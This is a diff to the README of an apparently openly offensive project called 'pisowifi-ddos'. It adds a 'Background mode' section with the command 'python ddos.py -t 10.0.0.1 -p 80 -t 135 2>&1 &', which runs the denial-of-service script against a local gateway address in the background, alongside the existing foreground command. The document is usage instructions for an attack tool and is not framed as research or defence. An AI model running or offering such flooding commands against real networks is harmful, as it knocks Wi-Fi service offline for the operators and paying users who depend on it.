@@ -36,6 +36,12 @@ cd ~/pisowifi-ddos
 ```
 python ddos.py -t 10.0.0.1 -p 80 -t 135
 ```
+> Background mode
+
+```
+python ddos.py -t 10.0.0.1 -p 80 -t 135 2>&1 &
+```
+
 <div align="center">
 <img src="https://github.com/xiv3r/pisowifi-ddos/blob/main/image/ddos.png">
 </div>
